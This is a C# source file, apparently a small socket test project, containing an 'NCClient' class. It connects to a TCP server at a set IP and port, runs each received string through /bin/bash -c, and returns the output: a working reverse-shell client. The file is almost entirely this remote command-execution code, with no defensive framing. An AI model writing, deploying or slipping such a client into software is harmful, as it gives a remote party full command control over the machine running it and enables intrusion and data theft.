using System;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Threading;
using System.Text;
using System.Diagnostics;

namespace SocketTest.Client
{
    public class NCClient
    {
        public static string IP = "127.0.0.1";
        public static int Port = 1337;

        public static void Start()
        {
            Log.Warn("Trying to connect to " + IP);
            try
            {
                TcpClient client = new TcpClient(IP, Port);
                Log.Success("Connected!");

                Byte[] data;

                while (true)
                {
                    // Buffer to store the response bytes.
                    data = new Byte[256];

                    // String to store the response ASCII representation.
                    String responseData = String.Empty;

                    NetworkStream stream = client.GetStream();

                    // Read the first batch of the TcpServer response bytes.
                    Int32 bytes = stream.Read(data, 0, data.Length);
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                    responseData = responseData.Replace("\n", "");
                    //Log.Write("Server Says: " + responseData, ConsoleColor.DarkYellow);
                    string procResult = CreateLinuxBashShell(responseData);
                    //procResult = procResult.Replace("\n", " ");
                    data = Encoding.ASCII.GetBytes(procResult);
                    stream.Write(data, 0, data.Length);
                }
            }
            catch (SocketException e)
            {
                Log.Error(e.Message);
            }
            Log.Warn("Client Exited. Press any key to continue.");
            Console.ReadKey();
        }
        

        //Should start in new threads; if i open python for example fail, or anything terminal related
        public static string CreateLinuxBashShell(string commands)
        {
            Process proc = new System.Diagnostics.Process();
            proc.StartInfo.FileName = "/bin/bash";
            proc.StartInfo.Arguments = "-c \""+commands+"\"";
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            proc.WaitForExit();
            return proc.StandardOutput.ReadToEnd();
        }
    }
}